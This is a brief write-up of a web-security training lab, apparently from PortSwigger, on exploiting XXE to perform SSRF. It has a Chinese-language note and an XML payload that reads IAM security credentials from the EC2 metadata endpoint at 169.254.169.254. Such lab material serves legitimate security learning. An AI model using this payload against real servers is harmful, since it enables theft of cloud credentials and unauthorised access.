# Lab: Exploiting XXE to perform SSRF attacks

This lab has a "Check stock" feature that parses XML input and returns any unexpected values in the response.

The lab server is running a (simulated) EC2 metadata endpoint at the default URL, which is http://169.254.169.254/. This endpoint can be used to retrieve data about the instance, some of which might be sensitive.

To solve the lab, exploit the XXE vulnerability to perform an SSRF attack that obtains the server's IAM secret access key from the EC2 metadata endpoint. 

## XXE
* 用 XXE 訪問內網可以看到會一直返回路徑，一路訪問就會到機密資料了
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE r [
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">
]>
<stockCheck>
<productId>&xxe;</productId><storeId>&xxe;</storeId></stockCheck>
```